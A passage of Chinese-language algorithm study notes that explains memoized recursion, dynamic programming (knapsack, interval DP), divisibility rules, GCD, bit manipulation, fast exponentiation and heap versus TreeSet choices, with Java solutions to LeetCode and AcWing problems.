encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n- 状态：`dp[i][j]`: 表示从坐标(i, j)开始所能获取所有严格递增路径的个数\n- 下一个状态：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  int n;\n  int m;\n  int[][] grid;\n  public int countPaths(int[][] grid) {\n    n = grid.length;\n    m = grid[0].length;\n    this.grid = grid;\n    int res = 0;\n    for (int r = 0; r < n; r++) {\n      for (int c = 0; c < m; c++) {\n        res += dfs(r, c);\n      }\n    }\n    return res;\n  }\n\n  int dfs(int r, int c) {\n    int res = 1;\n    int[] dr = new int[]{0, 1, 0, -1};\n    int[] dc = new int[]{1, 0, -1, 0};\n    for (int i = 0; i < 4; i++) {\n      int nr = r + dr[i];\n      int nc = c + dc[i];\n      if (nr >= 0 && nr < n && nc >= 0 && nc < m && grid[r][c] < grid[nr][nc]) {\n        res += dfs(nr, nc);\n      }\n    }\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int n;\n  int m;\n  int[][] grid;\n  Integer[][] dp;\n  public int countPaths(int[][] grid) {\n    n = grid.length;\n    m = grid[0].length;\n    this.grid = grid;\n    dp = new Integer[n][m];\n    int res = 0;\n    for (int r = 0; r < n; r++) {\n      for (int c = 0; c < m; c++) {\n        res = (int)(res % (1e9 + 7) + dfs(r, c) % (1e9 + 7));\n      }\n    }\n    return (int)(res % (1e9 + 7));\n  }\n\n  int dfs(int r, int c) {\n    int res = 1;\n    int[] dr = new int[]{0, 1, 0, -1};\n    int[] dc = new int[]{1, 0, -1, 0};\n    for (int i = 0; i < 4; i++) {\n      int nr = r + dr[i];\n      int nc = c + dc[i];\n      if (nr >= 0 && nr < n && nc >= 0 && nc < m && grid[r][c] < grid[nr][nc]) {\n        if (dp[nr][nc] == null) {\n          dp[nr][nc] = dfs(nr, nc);\n        }\n        res += dp[nr][nc];\n      }\n    }\n    return (int)(res % (1e9 + 7));\n  }\n}\n```\n\n#### 例题2: 二叉树中的最长交错路径\n[二叉树中的最长交错路径](https://leetcode.cn/problems/longest-zigzag-path-in-a-binary-tree/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220714182726.png)\n\n##### 递归\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass Solution {\n  int ans = 0;\n  public int longestZigZag(TreeNode root) {\n    traverse(root);\n    return ans;\n  }\n\n  void traverse(TreeNode node) {\n    if (node.left != null) {\n      ans = Math.max(ans, dfs(node.left, 0));\n      traverse(node.left);\n    }\n    if (node.right != null) {\n      ans = Math.max(ans, dfs(node.right, 1));\n      traverse(node.right);\n    }\n  }\n\n  int dfs(TreeNode node, Integer flag) {\n    int res = 1;\n    if (flag == 0 && node.right != null) {\n      return dfs(node.right, 1) + 1;\n    }\n    if (flag == 1 && node.left != null) {\n      return dfs(node.left, 0) + 1;\n    }\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass Solution {\n  int ans = 0;\n  Map<State, Integer> dp = new HashMap(); \n  public int longestZigZag(TreeNode root) {\n    traverse(root);\n    return ans;\n  }\n\n  void traverse(TreeNode node) {\n    if (node.left != null) {\n      ans = Math.max(ans, dfs(node.left, 0));\n      traverse(node.left);\n    }\n    if (node.right != null) {\n      ans = Math.max(ans, dfs(node.right, 1));\n      traverse(node.right);\n    }\n  }\n\n  int dfs(TreeNode node, Integer flag) {\n    int res = 1;\n    if (flag == 0 && node.right != null) {\n      if (!dp.containsKey(new State(node.right, 1))) {\n        dp.put(new State(node.right, 1), dfs(node.right, 1));\n      }\n      return dp.get(new State(node.right, 1)) + 1;\n    }\n    if (flag == 1 && node.left != null) {\n      if (!dp.containsKey(new State(node.left, 0))) {\n        dp.put(new State(node.left, 0), dfs(node.left, 0));\n      }\n      return dp.get(new State(node.left, 0)) + 1;\n    }\n    return res;\n  }\n\n  class State {\n    TreeNode node;\n    Integer flag;\n\n    public State(TreeNode node, Integer flag) {\n      this.node = node; \n      this.flag = flag;\n    }\n\n    public int hashCode() {\n      return Objects.hash(node, flag);\n    }\n\n    public boolean equals(Object o) {\n      if (o == null) return false;\n      State state = (State) o;\n      return node == state.node && flag == state.flag;\n    }\n\n  }\n}\n```\n\n#### 例题3: 最长字符串链\n[最长字符串链](https://leetcode.cn/problems/longest-string-chain/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220715104817.png)\n\n##### 分析\n首先将words中个个元素用在图中表示出来，表示方式为：如果s1是s2的前身，则s1指向s2。例如以`words = [\"a\",\"b\",\"ba\",\"bca\",\"bda\",\"bdca\"]`为例，用图表示如下:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220715111312.png)\n\n- 状态：`dp[i]`: 表示从words[i]开始所能获取到的最长单词链长度\n- 下一个状态：words[i]在图中所能到达的所有下一个的状态\n\n##### 递归\n```java\nclass Solution {\n  int ans = 1;\n  String[] words;\n  List<Integer>[] graph;\n  public int longestStrChain(String[] words) {\n    this.words = words;\n\n    // 转换为图\n    graph = new List[words.length]; \n    for (int i = 0; i < words.length; i++) {\n      graph[i] = new ArrayList();\n    }\n    for (int i = 0; i < words.length; i++) {\n      for (int j = 0; j < words.length; j++) {\n        if (judge(words[i], words[j])) {\n          graph[i].add(j);\n        }\n      }\n    }\n    \n    for (int i = 0; i < words.length; i++) {\n      ans = Math.max(ans, dfs(i)); \n    }\n    return ans;\n  }\n\n  int dfs(int i) {\n    int res = 1;\n    for (Integer item : graph[i]) {\n      res = Math.max(res, dfs(item) + 1);\n    }\n    return res;\n  }\n\n  // 判断s是否为s1的前身\n  boolean judge(String s, String s1) {\n    if (s1.length() - s.length() != 1) return false;\n    int i = s.length() - 1;\n    int j = s1.length() - 1;\n    char[] sCh = s.toCharArray();\n    char[] s1Ch = s1.toCharArray();\n    boolean flag = true;\n    while (i >= 0 && j >= 0) {\n      if (sCh[i] == s1Ch[j]) {\n        i--;\n        j--;\n      } else {\n        if (flag) {\n          j--;\n          flag = false;\n        } else {\n          return false;\n        }\n      }\n    }\n    return true;\n  }\n\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int ans = 1;\n  String[] words;\n  List<Integer>[] graph;\n  Integer[] dp;\n  public int longestStrChain(String[] words) {\n    this.words = words;\n\n    // 转换为图\n    graph = new List[words.length]; \n    for (int i = 0; i < words.length; i++) {\n      graph[i] = new ArrayList();\n    }\n    for (int i = 0; i < words.length; i++) {\n      for (int j = 0; j < words.length; j++) {\n        if (judge(words[i], words[j])) {\n          graph[i].add(j);\n        }\n      }\n    }\n    \n    dp = new Integer[words.length];\n    for (int i = 0; i < words.length; i++) {\n      ans = Math.max(ans, dfs(i)); \n    }\n    return ans;\n  }\n\n  int dfs(int i) {\n    int res = 1;\n    for (Integer item : graph[i]) {\n      if (dp[item] == null) dp[item] = dfs(item);\n      res = Math.max(res, dp[item] + 1);\n    }\n    return res;\n  }\n\n  // 判断s是否为s1的前身\n  boolean judge(String s, String s1) {\n    if (s1.length() - s.length() != 1) return false;\n    int i = s.length() - 1;\n    int j = s1.length() - 1;\n    char[] sCh = s.toCharArray();\n    char[] s1Ch = s1.toCharArray();\n    boolean flag = true;\n    while (i >= 0 && j >= 0) {\n      if (sCh[i] == s1Ch[j]) {\n        i--;\n        j--;\n      } else {\n        if (flag) {\n          j--;\n          flag = false;\n        } else {\n          return false;\n        }\n      }\n    }\n    return true;\n  }\n\n}\n```\n\n### 总结\n动态规划就是分治法的优化版。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220718233141.png)\n\n如上图中，分治法中递归树中的节点其实表达的都是同一种意思，即`f(状态) -> 值`，含义是：将某个状态带入转换式中得到对应的值\n\n所以在写分治法时，最关键的一步就是确定`f(状态) -> 值`\n\n<font color=\"red\">在递归树中，当一个子节点压入函数栈时，如果没有携带父节点当状态当话，子节点是无法访问父节点的状态的，所以此时子节点返回的值肯定与父节点的状态无关。而分治法中节点一般是不需要携带父节点中的状态的。所以当分治法中的子节点没有携带父节点中的状态时，**每个节点的返回值跟其父节点是什么状态没有任何关系，即节点的返回值不受父节点影响**。该结论十分十分重要!!!</font>\n\n**例如下面例题吃水果中子节点是没有携带父节点中的状态的，所以dp[i - 1][k]的值与第i个小朋友选了什么样的水果无关，同理dp[i - 1][k - 1]的值也与第i个小朋友选了什么样的水果无关**\n\n#### 例题: 吃水果\n[吃水果](https://www.acwing.com/problem/content/4499/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220718231439.png)\n\n##### 分析\n- 状态：dp[i][k]: 表示前i+1个小朋友中恰好有k个小朋友拿到的水果和其左边相邻小朋友拿到的水果不同的分发水果的方案数\n- 下一个状态：dp[i - 1][k]、dp[i - 1][k - 1]\n\n**由于子节点是没有携带父节点中的状态的，在写递归出口时，即求叶子节点的返回值时，不需要考虑其父节点是什么状态。**直接分析叶子节点的状态，将其状态代入`f(状态) -> 值`中即可。例如此题中的`f(状态) -> 值`为前i+1个小朋友中恰好有k个小朋友拿到的水果和其左边相邻小朋友拿到的水果不同的分发水果的方案数。所以dp[0][0]表示前1个小朋友中恰好有0个小朋友拿到的水果和其左边相邻小朋友拿到的水果不同的分发水果的方案数, 所以dp[0][0]等于0，\n\n##### 递归\n```java\nint n = cin.nextInt(), m = cin.nextInt(), k = cin.nextInt();\npublic void solve() {\n  System.out.println(dfs(n - 1, k));\n}\n\nlong dfs(int i, int k) {\n  if (i == 0 && k == 0) return m;\n  if (i == 0 || k < 0) return 0;\n  return (dfs(i - 1, k) + dfs(i - 1, k - 1) * (m - 1)) % 998244353;\n}\n```\n\n##### 带有备忘录的递归\n```java\nint n = cin.nextInt(), m = cin.nextInt(), k = cin.nextInt();\nLong[][] dp;\npublic void solve() {\n  dp = new Long[n + 2][k + 2];\n  System.out.println(dfs(n - 1, k));\n}\n\nlong dfs(int i, int k) {\n  if (i == 0 && k == 0) return m;\n  if (i == 0 || k < 0) return 0;\n  if (dp[i][k + 1] == null) {\n    dp[i][k + 1] = dfs(i - 1, k);\n  }\n  if (dp[i][k] == null) {\n    dp[i][k] = dfs(i - 1, k - 1);\n  }\n  return (dp[i][k + 1] + dp[i][k] * (m - 1)) % 998244353;\n}\n```\n\n## 闫式dp分析法\n核心思想：从集合的角度考虑\n<font color=\"red\">所有的dp问题，本质上都是有限集中的最值、数量问题</font>\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408164542.png)\n\n### 分析阶段\n动态规划有两个要点：状态与状态转移\n那么阶段自然也应该有两个：**状态表示**和**状态计算**\n#### 状态表示\n把几个具有相同点的元素合在一起考虑，成为一个状态\n对于一个状态 F(i) ，考虑两个角度：\n- **1.集合** ：F(i) 表示什么集合\n由于 F(i) 表示的是一堆东西(这也是DP优于枚举的核心)，我们要考虑这一堆东西的共同特征，如：所有满足某个条件的元素集合\n这一点请仔细考虑，到底是大于等于，大于，小于，小于等于，等于......这些的不同会导致状态计算方式的不同\n- **2.属性**：F(i)的值与集合的关系：如 max,min,count,sum 等\n很明显，F(i)的值大多数时候是一个数，代表这个集合的某一个属性，多是最大值、最小值、数量、总和等。题目问什么，属性一般就是什么\n\n#### 状态计算\n**三步走**\n1. 先看 F(i) 表示的集合：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182417.png)\n\n2. 将其划分为若干个子集合，要求不重(有些情况可以重复，例如求最大值)和不漏\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182430.png)\n\n<font color=\"red\">划分的依据：找最后一个不同点(这个待会会讲)</font>\n\n3. 划分过后，根据子集合来求F(i)\n如：当属性为 max 时，F(i)=max(子集的max)\n当属性为 count 时，F(i)=∑(子集的count)\n\n#### 代码优化\ndp问题的优化是对代码作等价变形，常用的手段是使用滚动数组\n\n### 选择问题的dp\n有关选择问题的dp，常见的就是背包问题。<font color=\"red\">而选择问题的状态表示都是很相似的，一般状态的第一维表示我只考虑前面i个物品，后面几维一般表示限制，比如体积的限制，重量的限制</font>\n\n#### 0-1背包问题\n[0-1背包问题-模板题](https://www.acwing.com/problem/content/2/)\n在上述例题中，由于每个物体只有2种可能的状态（取与不取），正如二进制中的0和1，这类问题便被称为「0-1 背包问题」。\n\n**1. 解析**\n根据乘法原理，总共的方案为$2^n$  。在所有的方案数中选择一个价值最大的方案，属于有限集的最优问题，可以用试着DP来解。\n\n**2. 状态表示**\n对于F(i,j)：\n集合：所有只考虑前i个物品，且总体积不超过的j的方案\n属性：题目要求我们求最大价值，则其属性就是max。\n\n**3. 状态计算**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182442.png)\n\n于是我们可以得到状态转移方程：\n$F(i,j)=max( F(i−1,j) , F(i−1,j−V_i)+W_i)$\n这就事朴素DP的分析过程了，至于压维等时空优化从状态转移方程出发\n\n**代码**\n```java\n/**\n* n: 表示物品数量\n* m: 表示背包容积\n* v[]: 表示第 i 件物品的体积\n* w[]: 表示第 i 件物品的价值\n*/\npublic static int f(){\n  int[][] dp = new int[N+1][V+1];\n  for(int i = 1; i <= N; i++){\n    for(int j = 0; j <= V; j++){\n      dp[i][j] = dp[i-1][j];\n      if(j >= v[i]) dp[i][j] = Math.max(dp[i][j], dp[i-1][j-v[i]]+w[i]);\n    }\n  }\n  return dp[N][V];\n}\n```\n\n#### 完全背包问题\n[完全背包问题-模板题](https://www.acwing.com/problem/content/3/)\n完全背包问题与0-1背包问题的不同点在于完全背包问题中的每种物品都有无限件可用\n\n**1. 解析**\n仍然从两个角度考虑：\n设状态 F(i,j)\n\n**2. 状态表示**\n对于 F(i,j):\n集合：所有只从前i个物品中选，总体积不超过j的所有方案。\n属性：max。\n原因和01背包相似\n\n**3. 状态计算**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408182455.png)\n\n于是易得状态转移方程：\n`$F(i,j)=max( F(i−1,j), F(i−1,j−V_i)+W_i, F(i−1,j−2*V_i)+2*W_i,...)$`\n\n但是这个东西项数太多，想办法把它转换成两项\n\n由上面的状态转移方程我们可以得到：\n`$F(i,j−V_i)=max( F(i−1,j−V_i), F(i−1,j−2*V_i)+W_i, F(i−1,j−3*V_i)+2*W_i ,...)$`\n观察得到，上面的第二项后面的每一项都是下面的每一项加上一个$W_i$。\n\n于是我们可以得到状态转移方程：\n$F(i,j)=max(F(i−1,j) , F(i,j−V_i)+W_i)$\n\n\n**代码**\n```java\n/**\n* n: 表示物品数量\n* m: 表示背包容积\n* v[]: 表示第 i 件物品的体积\n* w[]: 表示第 i 件物品的价值\n*/\npublic static int f(){\n  int[][] dp = new int[n+1][m+1];\n  for(int i = 1; i <= n; i++){\n    for(int j = 0; j <= m; j++){\n      dp[i][j] = dp[i-1][j];\n      if(j >= v[i]) f[i][j] = Math.max(dp[i][j], dp[i][j-v[i]]+w[i]);\n    }\n  }\n  return f[n][m];\n}\n```\n\n### 区间Dp\n顾名思义：区间dp就是在区间上进行动态规划，求解一段区间上的最优解。主要是通过合并小区间的 最优解进而得出整个大区间上最优解的dp算法。\n\n有关区间dp，常见的就是石子合并问题。<font color=\"red\">而区间dp的状态表示都是很相似的，一般状态的第一维表示区间的左端点，第二维表示区间的右端点</font>\n\n#### 石子合并问题\n[石子合并题目链接](https://www.acwing.com/problem/content/284/)\n\n**解析**\n满足有限集最优化\n\n**状态表示**\n对于F(i,j)\n集合：所有将区间`[i,j]`合并成一堆的方案集合\n属性：题目求的是最小值，所以min。\n\n**状态计算**\n1. 看这个F(i,j)表示的集合：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408162412.png)\n\n2. 将其划分若干个子集合\n考虑最后一个不同点\n最后一次， 也就是合并到`[i,j]`时，一定是由两个区间`[i,k]`和`[k,j]`合并而来的。显然，k∈`[i,j]`\n所以我们考虑以这个分界点 k 为划分依据，分成 j−i 类。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408162422.png)\n\n再来看一下合并的区间：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408162433.png)\n\n3. 根据子集合求F(i, j)\n以 左边`[i, i+2]`与右边`[i+3, j]`合并成一堆的子集合 为例 ，左边的`[i, i+2]`区间与右边的`[i+3, j]`区间互不干扰，所以两边取min再加上这部分石子的总质量，即为这个子集合的最小值，两边恰好是 F(i,i+2) 和 F(i+3,j)。于是这个子集合的最小代价为$F(i,i+2)+F(i+3,j)+S_j−S_{i−1}$ ，S是石子重量的前缀和。\n\n所以状态转移方程为：\n$F(i,j)=min( F(i, i)+F(i+1, j), F(i, i+1)+F(i+2, j), F(i, i+2)+F(i+3,j), ..., F(i, i+k)+F(i+k+1, j), ..., F(i, i+j-1)+F(j,j) ) + S_j-S_{i-1}$\n\n**代码**\n```java\npublic static int f(){\n  int[][] f = new int[n+1][n+1];\n  for(int len = 2; len <= n; len++){  //len表示区间的长度\n    for(int i = 1; i+len-1 <= n; i++){ //i表示区间的左端点\n      int j = i+len-1; //j表示区间的右端点\n      f[i][j] = Integer.MAX_VALUE;\n      for(int k = i; k < j; k++){\n        f[i][j] = Math.min(f[i][j], f[i][k]+f[k+1][j]);\n      }\n      f[i][j] = f[i][j] + s[j] - s[i-1];\n    }\n  } \n  return f[1][n];\n}\n```\n\n# 数论\n## 常用数的整除特征\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/d2ziUoPM9rE\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n### 方法\n\n#### 末位法\n- 能否被`2`，`5`整除，看末一位能否被2，5整除\n- 能否被`4`，`25`整除，看末二位能否被4，25整除\n- 能否被`8`，`125`整除，看末三位能否被8，125整除\n- 能否被$2^n$，$5^n$整除，看末n位能否被$2^n$，$5^n$整除\n\n例如：\n- 2025的为末一位能被5整除，则2025能被5整除\n- 2025的为末二位能被25整除，则2025能被25整除\n\n#### 数和法\n判断数A能否被`3`，`9`整除：把各位数字加起来，如果能被3，9整除，则数A能被3，9整除\n\n例如：\n- 2019的各位数字加起来为12，12能被3整除，所以2019能被3整除\n\n#### 数差法\n判断数A能否被`11`整除：如果`奇数位数字和`与`偶数位数字和`之差能被11整除，则数A能被11整除\n\n例如：\n- 4356中的奇数位和为9，偶数位数字和为9，它们差为0，0能被11整除，则4356能被11整除\n\n#### 截尾法\n判断数A能否被`7`,`11`,`13` 整除：截掉后面3位，如果截断后的数字与后面3位数字之差能被7，11，13整除，则数A能被7，11，13整除\n\n例如：\n- 2023截掉后面3位后值为2，2与023之差为21，21能被7整除，所以2023能被7整除\n\n\n#### 例题1: 整除子串\n[整除子串](https://www.acwing.com/problem/content/4429/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220718165705.png)\n\n##### 分析\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/SwneFgy_MxU\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n在acm中，会出现让你计算一个字符串中能被$2^n$或$5^n$整除的子串个数。如果暴力枚举每个子串进行统计的话，时间复杂度为$O(n^2)$,会TLE。\n\n我们可以使用末尾法来进行统计能被$2^n$或$5^n$整除的子串个数。\n\n代码：\n```java\nString str = cin.nextLine();\n\npublic void solve() {\n  Long res = 0l;\n  char[] charArray = str.toCharArray();\n  for (int i = 0; i < charArray.length; i++) {\n    if (Integer.valueOf(charArray[i]) % 4 == 0) {\n      res++;\n    }\n    if (i != 0 && Integer.valueOf(charArray[i - 1] + \"\" + charArray[i]) % 4 == 0) {\n      res += i;\n    }\n  }\n  System.out.println(res);\n}\n```\n\n## 最大公因数(约数)\n想要搞懂什么是最大公因数，就要先搞懂什么是`因数`、`整除`\n- 整除：`a|b`（“|”是整除符号），读作“a整除b, 或者b能被a整除”, 表示`b%a == 0`。例如10能被2整除；2整除10\n- 因数: 若`a|b`，则a是b的因数。例如10的所有因数为1、2、5、10\n\n最大公因数的性质:\n- 最大公因数能够被所有公因数整除，例如：45与15的公因数为1、3、5、15，其中最大公因数为15，15能够被公因数1、3、5、15整除\n- 最大因数能够被所有因数整除，例如45因数为1、3、5、9、15、45，其中最大公因数为45，45能够被所有因数1、3、5、9、15、45整除\n\n### 模版\n```java\n/**\n * 求最大公因数(greatest common divisor)\n */\nint gcd(int a, int b) {\n  // 辗转相除\n  return b ==0 ? a : gcd(b, a % b);\n}\n```\n\n### 求数字数组的最大公约数\n- 0除以任何一个数都得0, 所以0与一个数的最大公约数是这个数本身。\n- 注意0和0没有最大公约数\n```java\nint[] nums = {9, 6, 9, 3, 15};\nint d = 0;\nfor (int num : nums) {\n  d = gcd(d, num);\n}\n```\n\n##### 例题1: 使数组可以被整除的最少删除次数\n[使数组可以被整除的最少删除次数](https://leetcode.cn/problems/minimum-deletions-to-make-array-divisible/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721113106.png)\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/yv39FuCv0uk\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n     public int minOperations(int[] nums, int[] numsDivide) {\n      int b = 0;\n      for (int num : numsDivide) {\n        b = gcd(b, num);\n      }\n      Arrays.sort(nums);\n      int res = 0;\n      for (int num : nums) {\n        if (b % num != 0) {\n          res++;\n        } else {\n          break;\n        }\n      }\n      return res == nums.length ? -1 : res;\n    }\n\n    /**\n     * 求最大公因数(greatest common divisor)\n     */\n    int gcd(int a, int b) {\n      // 辗转相除\n      return b == 0 ? a : gcd(b, a % b);\n    }\n}\n```\n\n## 位运算\n### 消除二进制表示中的最后一个1\n`n&(n-1)`这个操作是算法中常见的，作用是消除数字 n 的二进制表示中的最后一个1。\n看个图就很容易理解了：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408162504.png)\n\n其核心逻辑就是，`n-1` 一定可以消除最后一个 1，同时把其后的 0 都变成 1，这样再和 n 做一次 & 运算，就可以仅仅把最后一个 1 变成 0 了。\n\n#### 例题1: 位1的个数\n[位1的个数](https://leetcode.cn/problems/number-of-1-bits/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220718164245.png)\n\n代码：\n```java\npublic class Solution {\n  // you need to treat n as an unsigned value\n  public int hammingWeight(int n) {\n    int res = 0;\n    while (n != 0) {\n      n = n & (n - 1);\n      res++;\n    }\n    return res;\n  }\n}\n```\n\n### 只保留二进制中的最后一个1\n使用`n & (-n)`就能只保留n的二进制中的最后一个1。这个技巧在树状数组中使用了\n\n例如20的二进制表示为`10100`, `20 & (-20)`的值为4，4的二进制表示为`100`\n\n### 判断一个数是不是2的指数\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220718165023.png)\n\n一个数如果是 2 的指数，那么它的二进制表示一定只含有一个 1：\n```\n2^0 = 1 = 0b0001\n2^1 = 2 = 0b0010\n2^2 = 4 = 0b0100\n```\n如果使用 n&(n-1) 的技巧就很简单了（注意运算符优先级，括号不可以省略）：\n```java\npublic boolean isPowerOfTwo(int n) {\n  return n > 0 && (n & (n - 1)) == 0;\n} \n```\n\n### 查找只出现一次的元素\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220718165319.png)\n\n这里就可以运用异或运算的性质：一个数和它本身做异或运算结果为 0，即`a ^ a = 0`；一个数和 0 做异或运算的结果为它本身，即`a ^ 0 = a`。\n\n对于这道题目，我们只要把所有数字进行异或，成对儿的数字就会变成 0，落单的数字和 0 做异或还是它本身，所以最后异或的结果就是只出现一次的元素：\n\n```java\nclass Solution {\n    public int singleNumber(int[] nums) {\n        int res = nums[0];\n        for (int i = 1; i < nums.length; i++) res ^= nums[i];\n        return res;\n    }\n}\n```\n\n### 例题1:操作后的最大异或和\n[操作后的最大异或和](https://leetcode.cn/problems/maximum-xor-after-operations/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220718183103.png)\n\n#### 分析\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/rwZ7a21Ygy4\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  public int maximumXOR(int[] nums) {\n    int res = 0;\n    for (int num : nums) {\n      res |= num;\n    }\n    return res;\n  }\n}\n```\n\n## 快速幂\n快速幂，二进制取幂（Binary Exponentiation，也称平方法），是一个在$O(logn)$的时间内计算$a^n$的小技巧，而暴力的计算需要$O(n)$的时间。而这个技巧也常常用在非计算的场景，因为它可以应用在任何具有结合律的运算中。其中显然的是它可以应用于模意义下取幂、矩阵幂等运算，我们接下来会讨论。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408162524.png)\n\n### 模板\n$求a^n$\n递归版\n```java\npublic long binpow(long a, long n){\n  if(n == 0) return 1;\n  long res = binpow(a, n/2);\n  if(n%2 == 1) \n    return res*res*a;\n  else\n    return res*res;\n}\n```\n非递归版\n```java\npublic static long binpow(long a, long n){\n  long res = 1;\n  while(n > 0){\n    if((n & 1) == 1) res = res * a; \n    a = a * a;\n    n >>= 1;\n  }\n  return res;\n}\n```\n\n**题目链接**\n[a^b](https://www.acwing.com/problem/content/submission/91/)\n\n## 64位整数乘法 \n求`(a*b)%p`，\n\n如果直接计算a乘b这会超过long的最大范围，所以采用类似于快速幂的思想把 b写成二进制形式，然后如果某位上为1就加上它`a*（2^n）`次方（n与这位的位置有关）并且每次计算后取模就可以了\n\n例如：计算`3*7`， 由于7的二进制为111, 所以`$3*7 = 3*(2^0)+3*(2^1)+3*(2^2)$`\n\n### 模板\n求`(a*b)%p`\n\n```java\npublic static long ksc(long a, long b, long p){\n  long res = 0;\n  while(b > 0){\n    if((b&1) == 1) res = (res+a)%p;\n    b >>= 1;\n    a = 2*a%p;\n  }\n  return res;\n}\n```\n\n\n# 区间信息维护与查询\n\n## Heap和BST的应用\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/15qVlx2wnt89JZWzfGKQ3P43IbK4UNJF1/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/zxPdekOBfTo\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/MocAQVJfJOQ\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n- 如果只需要找最值，就用`二分堆(PrioityQueue)`。\n- 如果我不止需要找到最值，还要进行搜索、删除指定元素、`lower_bound`或`upper_bound`操作，就用`二叉搜索树(TreeSet/TreeMap)`。\n\n### TreeSet vs PrioityQueue\n**PrioityQueue:**\n- O(n): remove(Object o), contains(Object o)\n- O(logN): add(E e), offer(E e), poll()\n- O(1): peek()\n\n**TreeSet:**\n- O(logN): add(), ceiling(), contains(), floor(), headSet(), higher(), lower(), remove(), subSet(), tailSet() \n- O(1): comparator(), iterator(), clear(), first(), isEMpty(), size(), last(), pollFirst(), pollLast()\n\n**通过上述我们可以发现PrioityQueue的remove的时间复杂度高于TreeSet。**所以我们使用PriorityQueue时，如果要进行大量的remove操作，我们需要考虑是否能够将PrioirtyQueue替换成TreeSet。例如下面的例题`设计数字容器系统`中，就需要将PriorityQueue替换成TreeSet才不会超时\n\n#### 例题1: 设计数字容器系统\n[设计数字容器系统](https://leetcode.cn/problems/design-a-number-container-system/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220726101857.png)\n\n使用PrioityQueue，代码如下：\n```java\nclass NumberContainers {\n\n  Map<Integer, Integer> IndexToNumber = new HashMap<>();\n  Map<Integer, PriorityQueue<Integer>> numberToIndex = new HashMap<>();\n  public NumberContainers() {\n\n  }\n\n  public void change(int index, int number) {\n    Integer preNum = IndexToNumber.get(index);\n    IndexToNumber.put(index, number);\n    if (preNum != null) {\n      numberToIndex.get(preNum).remove(index);\n    }\n    numberToIndex.computeIfAbsent(number, p -> new PriorityQueue<>()).add(index);\n  }\n\n  public int find(int number) {\n    PriorityQueue<Integer> integers = numberToIndex.get(number);\n    if (integers == null || integers.size() == 0) return -1;\n    return integers.peek();\n  }\n}\n```\n上述代码会超时，那是因为PriorityQueue进行remove操作的时间复杂度度为O(n)，而我们需要大量进行Remove操作，所以我们需要换成一个remove操作的时间复杂度低的数据结构TreeSet。TreeSet的remove操作的时间复杂度为O(logN)。代码如下：\n\n```java\nclass NumberContainers {\n\n  Map<Integer, Integer> IndexToNumber = new HashMap<>();\n  Map<Integer, TreeSet<Integer>> numberToIndex = new HashMap<>();\n  public NumberContainers() {\n\n  